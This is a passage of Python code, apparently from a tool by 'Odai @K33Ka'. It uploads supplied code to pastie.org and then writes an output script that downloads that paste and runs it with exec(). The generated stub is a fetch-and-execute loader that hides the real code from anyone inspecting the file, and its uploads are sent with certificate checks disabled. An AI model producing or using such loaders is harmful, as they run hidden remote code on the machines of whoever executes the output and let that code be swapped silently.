                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'http://pastie.org',
                'Referer': 'http://pastie.org/',
                'User-Agent': 'Mozilla/5.0',
            }
            data = {
                'language': 'plaintext',
                'content': code,
            }
            res = requests.post(
                'http://pastie.org/pastes/create',
                headers=headers,
                data=data,
                verify=False,
                timeout=10
            ).text
            match = re.search(
                r'<div class="item"><a href="([^"]+)">raw</a></div>',
                res
            )
            if not match:
                return {
                    "status": False,
                    "error": "Failed to extract link",
                    "Dev": file_converter.DEV
                }
            link = match.group(1)
            output_code = (
                "from requests import get as odai\n"
                f"k33ka = odai('http://pastie.org{link}')\n"
                "exec(k33ka.text)"
            )
            output_path = "output-K33Ka.py"
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(output_code)
            end_time = time.time()
            return {
                "status": True,
                "output_file": output_path,
                "paste_link": f"http://pastie.org{link}",
                "time_sec": round(end_time - start_time, 2),
                "Dev": "Odai @K33Ka"
            }

        except Exception as e:
            return {
                "status": False,
                "error": str(e),
                "Dev": "Odai @K33Ka"
            }